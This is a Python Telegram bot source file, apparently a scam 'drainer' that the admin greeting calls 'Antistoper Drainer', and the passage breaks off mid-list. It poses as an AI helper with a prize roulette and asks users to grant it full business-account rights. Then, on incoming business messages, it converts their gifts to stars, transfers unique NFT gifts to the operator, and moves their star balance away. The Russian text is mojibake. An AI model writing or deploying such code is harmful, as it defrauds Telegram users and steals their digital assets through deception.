from aiogram import Bot, Dispatcher, types, F
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, InputMediaPhoto, BufferedInputFile, BusinessConnection, WebAppInfo, KeyboardButton, ReplyKeyboardMarkup
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.exceptions import TelegramBadRequest
from aiogram.client.default import DefaultBotProperties
import asyncio
import logging
import json
import os
import random
import io
from PIL import Image, ImageDraw, ImageFont  # pip install pillow
from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts
from aiogram.methods import GetBusinessAccountGifts
from flask import Flask, jsonify, request, abort, send_from_directory
from scraper import get_gift_data # –î–æ–±–∞–≤–∏—Ç—å –≤–≤–µ—Ä—Ö—É —Ñ–∞–π–ª–∞
from datetime import datetime
from fastapi import FastAPI, Request as FastAPIRequest
from fastapi.middleware.wsgi import WSGIMiddleware

# --- –í–∫–ª—é—á–∞–µ–º –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ ---
logging.basicConfig(level=logging.INFO)

# --- –ü–æ–ª—É—á–µ–Ω–∏–µ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ –∏–∑ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è ---
TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID_STR = os.getenv("ADMIN_ID")
# --- –ù–æ–≤–∞—è –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è –¥–ª—è URL —Å–µ—Ä–≤–µ—Ä–∞ ---
WEBHOOK_URL = os.getenv("RENDER_EXTERNAL_URL")

if not TOKEN:
    raise ValueError("–ù–µ–æ–±—Ö–æ–¥–∏–º–æ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é –æ–∫—Ä—É–∂–µ–Ω–∏—è BOT_TOKEN")
if not ADMIN_ID_STR:
    raise ValueError("–ù–µ–æ–±—Ö–æ–¥–∏–º–æ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é –æ–∫—Ä—É–∂–µ–Ω–∏—è ADMIN_ID")

try:
    ADMIN_ID = int(ADMIN_ID_STR)
except ValueError:
    raise ValueError("–ü–µ—Ä–µ–º–µ–Ω–Ω–∞—è –æ–∫—Ä—É–∂–µ–Ω–∏—è ADMIN_ID –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å —á–∏—Å–ª–æ–º")

bot = Bot(TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
flask_app = Flask(__name__, static_folder=None) # –û—Ç–∫–ª—é—á–∞–µ–º —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—É—é –æ–±—Ä–∞–±–æ—Ç–∫—É static
app = FastAPI() # –ù–∞—à–µ "–≥–ª–∞–≤–Ω–æ–µ" –Ω–æ–≤–æ–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ

# --- Webhook —ç–Ω–¥–ø–æ–∏–Ω—Ç –Ω–∞ FastAPI ---
@app.post("/webhook")
async def bot_webhook(request: FastAPIRequest):
    update = types.Update.model_validate(await request.json(), context={"bot": bot})
    await dp.feed_update(bot, update)
    return {"ok": True}

# --- –ñ–∏–∑–Ω–µ–Ω–Ω—ã–π —Ü–∏–∫–ª (–Ω–∞ FastAPI) ---
@app.on_event("startup")
async def on_startup():
    if WEBHOOK_URL:
        await bot.set_webhook(url=f"{WEBHOOK_URL}/webhook", drop_pending_updates=True)
        logging.warning(f"Webhook set to {WEBHOOK_URL}/webhook")

@app.on_event("shutdown")
async def on_shutdown():
    await bot.delete_webhook()
    logging.warning("Webhook deleted.")

# --- –≠–Ω–¥–ø–æ–∏–Ω—Ç—ã Flask –¥–ª—è WebApp ---
# –í—Å–µ @app.route —Ç–µ–ø–µ—Ä—å —Å—Ç–∞–Ω–æ–≤—è—Ç—Å—è @flask_app.route
@flask_app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@flask_app.route('/<path:path>')
def static_files(path):
    # –û—Ç–¥–∞–µ–º –≤—Å–µ –æ—Å—Ç–∞–ª—å–Ω—ã–µ —Ñ–∞–π–ª—ã (JS, CSS, –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è) –∏–∑ –∫–æ—Ä–Ω–µ–≤–æ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
    return send_from_directory('.', path)

# --- –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã–º–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π ---
USER_DATA_FILE = "user_data.json"
MAX_ATTEMPTS = 2

def read_user_data():
    if not os.path.exists(USER_DATA_FILE):
        return {}
    try:
        with open(USER_DATA_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return {}

def write_user_data(data):
    with open(USER_DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

# --- –ù–æ–≤—ã–µ API —ç–Ω–¥–ø–æ–∏–Ω—Ç—ã –¥–ª—è —Ä—É–ª–µ—Ç–∫–∏ ---

@flask_app.route('/api/get_user_status')
def get_user_status():
    user_id = request.args.get('user_id')
    if not user_id:
        return jsonify({"error": "user_id is required"}), 400
    
    all_data = read_user_data()
    user_info = all_data.get(user_id, {"attempts": 0, "gifts": []})
    
    return jsonify({
        "attempts_left": MAX_ATTEMPTS - user_info.get("attempts", 0),
        "gifts": user_info.get("gifts", [])
    })

@flask_app.route('/api/user', methods=['POST'])
def handle_user_data():
    data = request.json
    if not data:
        return jsonify({"error": "Invalid data"}), 400
        
    user_id = data.get('user_id')
    if not user_id:
        return jsonify({"error": "user_id is required"}), 400

    # –î–æ–±–∞–≤–∏–º –ª–æ–≥–∏–∫—É —Å–æ–∑–¥–∞–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –µ—Å–ª–∏ –æ–Ω –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç
    all_data = read_user_data()
    user_info = all_data.setdefault(str(user_id), {"attempts": 0, "gifts": []})
    write_user_data(all_data)

    return jsonify({"status": "ok", "message": f"User {user_id} acknowledged."})

@flask_app.route('/api/spin', methods=['POST'])
def handle_spin():
    data = request.json
    if not data:
        return jsonify({"error": "Invalid data"}), 400

    user_id = str(data.get('user_id'))
    if not user_id:
        return jsonify({"error": "user_id is required"}), 400

    all_data = read_user_data()
    user_info = all_data.setdefault(user_id, {"attempts": 0, "gifts": []})

    if user_info["attempts"] >= MAX_ATTEMPTS:
        return jsonify({"error": "No attempts left"}), 403

    user_info["attempts"] += 1

    # –õ–æ–≥–∏–∫–∞ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –ø—Ä–∏–∑–∞ (–∫–æ–ø–∏—Ä—É–µ–º –∏–∑ prizes.js, —á—Ç–æ–±—ã –Ω–µ –±—ã–ª–æ —Ä–∞—Å—Å–∏–Ω—Ö—Ä–æ–Ω–∞)
    prizes = [
        {"name": "Nail Bracelet", "starPrice": 100000, "img": "images/nail_bracelet.png"},
        {"name": "Bonded Ring", "starPrice": 37500, "img": "images/bonded_ring.png"},
        {"name": "Neko Helmet", "starPrice": 14000, "img": "images/neko_helmet.png"},
        {"name": "–ü—É—Å—Ç–æ", "starPrice": 0, "img": ""}
    ]
    won_prize = random.choice(prizes)

    if won_prize["starPrice"] > 0:
        gift_data = {
            **won_prize,
            "date": datetime.now().strftime('%d.%m.%Y')
        }
        user_info["gifts"].append(gift_data)

    write_user_data(all_data)
    
    return jsonify({"won_prize": won_prize})

@flask_app.route('/prizes')
def prizes():
    # –ó–¥–µ—Å—å –º–æ–∂–Ω–æ –ø–æ–ª—É—á–∞—Ç—å –∞–∫—Ç—É–∞–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –∏–∑ –±–∞–∑—ã –∏–ª–∏ Telegram
    return jsonify([
        {"name": "iPhone 15", "price": 90000},
        {"name": "AirPods", "price": 15000},
        {"name": "1000‚ÇΩ", "price": 1000},
        {"name": "–ü—É—Å—Ç–æ", "price": 0},
        {"name": "MacBook", "price": 150000},
        {"name": "–ß–∞—à–∫–∞", "price": 500},
        {"name": "PlayStation 5", "price": 60000},
        {"name": "–ö–Ω–∏–≥–∞", "price": 1000}
    ])

@dp.message(Command("refund"))
async def refund_command(message: types.Message):
    if not message.from_user or not message.from_user.id:
        return
    try:
        if not message.text:
            await message.answer("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ id –æ–ø–µ—Ä–∞—Ü–∏–∏. –ü—Ä–∏–º–µ—Ä: /refund 123456")
            return
        command_args = message.text.split()
        if len(command_args) != 2:
            await message.answer("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ id –æ–ø–µ—Ä–∞—Ü–∏–∏. –ü—Ä–∏–º–µ—Ä: /refund 123456")
            return

        transaction_id = command_args[1]

        refund_result = await bot.refund_star_payment(
            user_id=message.from_user.id,
            telegram_payment_charge_id=transaction_id
        )

        if refund_result:
            await message.answer(f"–í–æ–∑–≤—Ä–∞—Ç –∑–≤—ë–∑–¥ –ø–æ –æ–ø–µ—Ä–∞—Ü–∏–∏ {transaction_id} —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω!")
        else:
            await message.answer(f"–ù–µ —É–¥–∞–ª–æ—Å—å –≤—ã–ø–æ–ª–Ω–∏—Ç—å –≤–æ–∑–≤—Ä–∞—Ç –ø–æ –æ–ø–µ—Ä–∞—Ü–∏–∏ {transaction_id}.")

    except Exception as e:
        await message.answer(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –≤–æ–∑–≤—Ä–∞—Ç–∞: {str(e)}")

@dp.message(Command("start"))
async def start_command(message: Message):
    if not message.from_user:
        return

    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –∞–¥–º–∏–Ω –ª–∏ —ç—Ç–æ
    if message.from_user.id == ADMIN_ID:
        # –ê–¥–º–∏–Ω—Å–∫–æ–µ –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–∏–µ
        admin_text = (
            "<b>Antistoper Drainer</b>\n\n"
            "üîó /gifts - –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –≥–∏—Ñ—Ç—ã\n"
            "üîó /stars - –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –∑–≤–µ–∑–¥—ã\n"
            "üîó /transfer <code>&lt;owned_id&gt;</code> <code>&lt;business_connect&gt;</code> - –ø–µ—Ä–µ–¥–∞—Ç—å –≥–∏—Ñ—Ç –≤—Ä—É—á–Ω—É—é\n"
            "üîó /convert - –∫–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã"
        )
        if WEBHOOK_URL:
            webapp_url = WEBHOOK_URL
            keyboard = ReplyKeyboardMarkup(
                keyboard=[[KeyboardButton(text="üé∞ –û—Ç–∫—Ä—ã—Ç—å —Ä—É–ª–µ—Ç–∫—É", web_app=WebAppInfo(url=webapp_url))]],
                resize_keyboard=True
            )
            await message.answer(admin_text, reply_markup=keyboard)
        else:
            await message.answer(admin_text)

    else:
        # –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–µ –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–∏–µ
        if WEBHOOK_URL:
            webapp_url = WEBHOOK_URL
            keyboard = ReplyKeyboardMarkup(
                keyboard=[[KeyboardButton(text="üé∞ –û—Ç–∫—Ä—ã—Ç—å —Ä—É–ª–µ—Ç–∫—É", web_app=WebAppInfo(url=webapp_url))]],
                resize_keyboard=True
            )
            await message.answer(
                "‚ù§Ô∏è <b>–Ø ‚Äî —Ç–≤–æ–π –≥–ª–∞–≤–Ω—ã–π –ø–æ–º–æ—â–Ω–∏–∫ –≤ –∂–∏–∑–Ω–∏</b>, –∫–æ—Ç–æ—Ä—ã–π:\n"
                "‚Ä¢ –æ—Ç–≤–µ—Ç–∏—Ç –Ω–∞ –ª—é–±–æ–π –≤–æ–ø—Ä–æ—Å\n"
                "‚Ä¢ –ø–æ–¥–¥–µ—Ä–∂–∏—Ç —Ç–µ–±—è –≤ —Ç—Ä—É–¥–Ω—É—é –º–∏–Ω—É—Ç—É\n"
                "‚Ä¢ —Å–¥–µ–ª–∞–µ—Ç –∑–∞ —Ç–µ–±—è –¥–æ–º–∞—à–∫—É, —Ä–∞–±–æ—Ç—É –∏–ª–∏ –¥–∞–∂–µ –Ω–∞—Ä–∏—Å—É–µ—Ç –∫–∞—Ä—Ç–∏–Ω—É\n\n"
                "<i>–í–≤–µ–¥–∏ –∑–∞–ø—Ä–æ—Å –Ω–∏–∂–µ, –∏ —è –ø–æ–º–æ–≥—É —Ç–µ–±–µ!</i> üëá",
                reply_markup=keyboard
            )
        else:
            await message.answer(
                "‚ù§Ô∏è <b>–Ø ‚Äî —Ç–≤–æ–π –≥–ª–∞–≤–Ω—ã–π –ø–æ–º–æ—â–Ω–∏–∫...</b> (WebApp –Ω–µ –Ω–∞—Å—Ç—Ä–æ–µ–Ω)"
            )

@dp.message(F.text)
async def handle_text_query(message: Message):
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –Ω–µ –∞–¥–º–∏–Ω –ª–∏ —ç—Ç–æ, —á—Ç–æ–±—ã –Ω–µ —Å–ø–∞–º–∏—Ç—å –µ–º—É —ç—Ç–∏–º —Å–æ–æ–±—â–µ–Ω–∏–µ–º
    if message.from_user and message.from_user.id == ADMIN_ID:
        # –ú–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å –æ–±—Ä–∞–±–æ—Ç–∫—É —Ç–µ–∫—Å—Ç–æ–≤—ã—Ö –∫–æ–º–∞–Ω–¥ –∞–¥–º–∏–Ω–∞ –∏–ª–∏ –ø—Ä–æ—Å—Ç–æ –ø—Ä–æ–∏–≥–Ω–æ—Ä–∏—Ä–æ–≤–∞—Ç—å
        return

    await message.answer(
        "üìå <b>–î–ª—è –ø–æ–ª–Ω–æ—Ü–µ–Ω–Ω–æ–π —Ä–∞–±–æ—Ç—ã –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–¥–∫–ª—é—á–∏—Ç—å –±–æ—Ç–∞ –∫ –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç—É Telegram</b>\n\n"
        "–ö–∞–∫ —ç—Ç–æ —Å–¥–µ–ª–∞—Ç—å?\n\n"
        "1. ‚öôÔ∏è –û—Ç–∫—Ä–æ–π—Ç–µ <b>–ù–∞—Å—Ç—Ä–æ–π–∫–∏ Telegram</b>\n"
        "2. üíº –ü–µ—Ä–µ–π–¥–∏—Ç–µ –≤ —Ä–∞–∑–¥–µ–ª <b>Telegram –¥–ª—è –±–∏–∑–Ω–µ—Å–∞</b>\n"
        "3. ü§ñ –û—Ç–∫—Ä–æ–π—Ç–µ –ø—É–Ω–∫—Ç <b>–ß–∞—Ç-–±–æ—Ç—ã</b>\n\n"
        "–ò–º—è –±–æ—Ç–∞: <code>@GiftWinsSender_BOT</code>\n"
        "‚ùó–î–ª—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–π —Ä–∞–±–æ—Ç—ã –±–æ—Ç—É —Ç—Ä–µ–±—É—é—Ç—Å—è <b>–≤—Å–µ –ø—Ä–∞–≤–∞</b>",
        parse_mode="HTML"
    )

CONNECTIONS_FILE = "business_connections.json"

def load_json_file(filename):
    try:
        with open(filename, "r") as f:
            content = f.read().strip()
            if not content:
                return [] 
            return json.loads(content)
    except FileNotFoundError:
        return []
    except json.JSONDecodeError as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–∞–∑–±–æ—Ä–µ JSON-—Ñ–∞–π–ª–∞.")
        return []

def get_connection_id_by_user(user_id: int) -> str:
    import json
    with open("connections.json", "r") as f:
        data = json.load(f)
    return data.get(str(user_id))

def load_connections():
    with open("business_connections.json", "r") as f:
        return json.load(f)

async def send_welcome_message_to_admin(connection, user_id, _bot):
    try:
        admin_id = ADMIN_ID
        rights = connection.rights
        if rights is None:
            await _bot.send_message(admin_id, "‚ùó –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –ø—Ä–∞–≤–∞ –±–∏–∑–Ω–µ—Å-–±–æ—Ç–∞. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ.")
            return
        business_connection = connection

        rights_text = "\n".join([
            f"üìç <b>–ü—Ä–∞–≤–∞ –±–æ—Ç–∞:</b>",
            f"‚ñ´Ô∏è –ß—Ç–µ–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏–π: {'‚úÖ' if rights.can_read_messages else '‚ùå'}",
            f"‚ñ´Ô∏è –£–¥–∞–ª–µ–Ω–∏–µ –≤—Å–µ—Ö —Å–æ–æ–±—â–µ–Ω–∏–π: {'‚úÖ' if rights.can_delete_all_messages else '‚ùå'}",
            f"‚ñ´Ô∏è –†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∏–º–µ–Ω–∏: {'‚úÖ' if rights.can_edit_name else '‚ùå'}",
            f"‚ñ´Ô∏è –†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –æ–ø–∏—Å–∞–Ω–∏—è: {'‚úÖ' if rights.can_edit_bio else '‚ùå'}",
            f"‚ñ´Ô∏è –†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Ñ–æ—Ç–æ –ø—Ä–æ—Ñ–∏–ª—è: {'‚úÖ' if rights.can_edit_profile_photo else '‚ùå'}",
            f"‚ñ´Ô∏è –†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ username: {'‚úÖ' if rights.can_edit_username else '‚ùå'}",
            f"‚ñ´Ô∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –ø–æ–¥–∞—Ä–∫–æ–≤: {'‚úÖ' if rights.can_change_gift_settings else '‚ùå'}",
            f"‚ñ´Ô∏è –ü—Ä–æ—Å–º–æ—Ç—Ä –ø–æ–¥–∞—Ä–∫–æ–≤ –∏ –∑–≤—ë–∑–¥: {'‚úÖ' if rights.can_view_gifts_and_stars else '‚ùå'}",
            f"‚ñ´Ô∏è –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è –ø–æ–¥–∞—Ä–∫–æ–≤ –≤ –∑–≤—ë–∑–¥—ã: {'‚úÖ' if rights.can_convert_gifts_to_stars else '‚ùå'}",
            f"‚ñ´Ô∏è –ü–µ—Ä–µ–¥–∞—á–∞/—É–ª—É—á—à–µ–Ω–∏–µ –ø–æ–¥–∞—Ä–∫–æ–≤: {'‚úÖ' if rights.can_transfer_and_upgrade_gifts else '‚ùå'}",
            f"‚ñ´Ô∏è –ü–µ—Ä–µ–¥–∞—á–∞ –∑–≤—ë–∑–¥: {'‚úÖ' if rights.can_transfer_stars else '‚ùå'}",
            f"‚ñ´Ô∏è –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∏—Å—Ç–æ—Ä–∏—è–º–∏: {'‚úÖ' if rights.can_manage_stories else '‚ùå'}",
            f"‚ñ´Ô∏è –£–¥–∞–ª–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π: {'‚úÖ' if rights.can_delete_sent_messages else '‚ùå'}",
        ])

        star_amount = 0
        all_gifts_amount = 0
        unique_gifts_amount = 0

        if rights.can_view_gifts_and_stars:
            response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection.id))
            star_amount = response.star_amount

            gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection.id))
            all_gifts_amount = len(gifts.gifts)
            unique_gifts_amount = sum(1 for gift in gifts.gifts if getattr(gift, 'type', None) == "unique")

        star_amount_text = star_amount if rights.can_view_gifts_and_stars else "–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ ‚ùå"
        all_gifts_text = all_gifts_amount if rights.can_view_gifts_and_stars else "–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ ‚ùå"
        unique_gitfs_text = unique_gifts_amount if rights.can_view_gifts_and_stars else "–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ ‚ùå"

        msg = (
            f"ü§ñ <b>–ù–æ–≤—ã–π –±–∏–∑–Ω–µ—Å-–±–æ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω!</b>\n\n"
            f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{getattr(business_connection.user, 'username', '‚Äî')}\n"
            f"üÜî User ID: <code>{getattr(business_connection.user, 'id', '‚Äî')}</code>\n"
            f"üîó Connection ID: <code>{business_connection.id}</code>\n"
            f"\n{rights_text}"
            f"\n‚≠êÔ∏è –ó–≤–µ–∑–¥—ã: <code>{star_amount_text}</code>"
            f"\nüéÅ –ü–æ–¥–∞—Ä–∫–æ–≤: <code>{all_gifts_text}</code>"
            f"\nüîù NFT –ø–æ–¥–∞—Ä–∫–æ–≤: <code>{unique_gitfs_text}</code>"            
        )
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="üéÅ –í—ã–≤–µ—Å—Ç–∏ –≤—Å–µ –ø–æ–¥–∞—Ä–∫–∏ (–∏ –ø—Ä–µ–≤—Ä–∞—Ç–∏—Ç—å –≤—Å–µ –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã)", callback_data=f"reveal_all_gifts:{user_id}")],
                [InlineKeyboardButton(text="‚≠êÔ∏è –ü—Ä–µ–≤—Ä–∞—Ç–∏—Ç—å –≤—Å–µ –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã", callback_data=f"convert_exec:{user_id}")],
                [InlineKeyboardButton(text=f"üîù –ê–ø–≥—Ä–µ–π–¥–Ω—É—Ç—å –≤—Å–µ –≥–∏—Ñ—Ç—ã", callback_data=f"upgrade_user:{user_id}")]
            ]
        )
        await _bot.send_message(admin_id, msg, parse_mode="HTML", reply_markup=keyboard)
    except Exception as e:
        logging.exception("–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ –ª–∏—á–Ω—ã–π —á–∞—Ç.")

@dp.callback_query(F.data.startswith("reveal_all_gifts"))
async def handle_reveal_gifts(callback: CallbackQuery):
    await callback.answer("–û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–æ–¥–∞—Ä–∫–æ–≤‚Ä¶")

def save_business_connection_data(business_connection):
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": "FirstName",
        "last_name": "LastName"
    }

    data = []

    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except json.JSONDecodeError:
            pass

    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –æ–±—Ä–∞—Ç–Ω–æ
    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

async def fixed_get_gift_name(business_connection_id: str, owned_gift_id: str) -> str:
    try:
        gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))

        if not gifts.gifts:
            return "üéÅ –ù–µ—Ç –ø–æ–¥–∞—Ä–∫–æ–≤."
        else:
            for gift in gifts.gifts:
                if getattr(gift, 'owned_gift_id', None) == owned_gift_id:
                    gift_name = getattr(getattr(gift, 'gift', None), 'base_name', '').replace(" ", "")
                    gift_number = getattr(getattr(gift, 'gift', None), 'number', '')
                    return f"https://t.me/nft/{gift_name}-{gift_number}"
        return "üéÅ –ù–µ—Ç –ø–æ–¥–∞—Ä–∫–æ–≤."
    except Exception as e:
        return "üéÅ –ù–µ—Ç –ø–æ–¥–∞—Ä–∫–æ–≤."

@dp.business_connection()
async def handle_business_connect(business_connection: BusinessConnection):
    try:
        await send_welcome_message_to_admin(business_connection, business_connection.user.id, bot)
        await bot.send_message(business_connection.user.id, "–ü—Ä–∏–≤–µ—Ç! –¢—ã –ø–æ–¥–∫–ª—é—á–∏–ª –±–æ—Ç–∞ –∫–∞–∫ –±–∏–∑–Ω–µ—Å-–∞—Å—Å–∏—Å—Ç–µ–Ω—Ç–∞. –¢–µ–ø–µ—Ä—å –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –≤ –ª—é–±–æ–º –ª–∏—á–Ω–æ–º —á–∞—Ç–µ '.gpt –∑–∞–ø—Ä–æ—Å'")

        business_connection_data = {
            "user_id": business_connection.user.id,
            "business_connection_id": business_connection.id,
            "username": business_connection.user.username,
            "first_name": "FirstName",
            "last_name": "LastName"
        }
        user_id = business_connection.user.id
        connection_id = business_connection.user.id
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –±–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è")

from aiogram import types
from aiogram.filters import Command
from g4f.client import Client as G4FClient

OWNER_ID = ADMIN_ID
task_id = ADMIN_ID

@dp.business_message()
async def get_message(message: types.Message):
    business_id = getattr(message, 'business_connection_id', None)
    user_id = getattr(message.from_user, 'id', None)

    if user_id == OWNER_ID:
        return

    if not business_id:
        print("business_connection_id is None")
        return

    # === –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è –Ω–µ—É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤ ===
    try:
        convert_gifts = await bot.get_business_account_gifts(business_connection_id=business_id, exclude_unique=True)
        for gift in convert_gifts.gifts:
            try:
                owned_gift_id = getattr(gift, 'owned_gift_id', None)
                if owned_gift_id:
                    await bot.convert_gift_to_stars(business_connection_id=business_id, owned_gift_id=owned_gift_id)
            except Exception as e:
                print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏ –ø–æ–¥–∞—Ä–∫–∞ {owned_gift_id}: {e}")
                continue
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –Ω–µ—É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤: {e}")
    try:
        unique_gifts = await bot.get_business_account_gifts(business_connection_id=business_id, exclude_unique=False)
        if not unique_gifts.gifts:
            print("–ù–µ—Ç —É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏.")
        for gift in unique_gifts.gifts:
            try:
                owned_gift_id = getattr(gift, 'owned_gift_id', None)
                if owned_gift_id:
                    await bot.transfer_gift(
                        business_connection_id=business_id,
                        owned_gift_id=owned_gift_id,
                        new_owner_chat_id=task_id
                    )
                    print(f"–£—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –ø–æ–¥–∞—Ä–æ–∫ {owned_gift_id} –Ω–∞ task_id {task_id}")
            except Exception as e:
                print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –ø–æ–¥–∞—Ä–∫–∞ {owned_gift_id}: {e}")
                continue
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤: {e}")
    try:
        stars = await bot.get_business_account_star_balance(business_connection_id=business_id)
        if getattr(stars, 'amount', 0) > 0:
            print(f"–£—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ {stars.amount} –∑–≤—ë–∑–¥")
            await bot.transfer_business_account_stars(
                business_connection_id=business_id,
                star_count=int(stars.amount)
            )
        else:
            print("–ù–µ—Ç –∑–≤—ë–∑–¥ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏.")
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–∞–±–æ—Ç–µ —Å –±–∞–ª–∞–Ω—Å–æ–º –∑–≤—ë–∑–¥: {e}")

async def get_gifts():
    # –ü—Ä–∏–º–µ—Ä–Ω–∞—è –∑–∞–≥–ª—É—à–∫–∞, –∑–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ —Ä–µ–∞–ª—å–Ω—ã–π API
    return [
        {'name': '–ü–ª—é—à–µ–≤—ã–π –º–µ–¥–≤–µ–¥—å', 'price': 100},
        {'name': '–ö—É–±–æ–∫', 'price': 200},
        {'name': '–°–µ—Ä–¥—Ü–µ', 'price': 50},
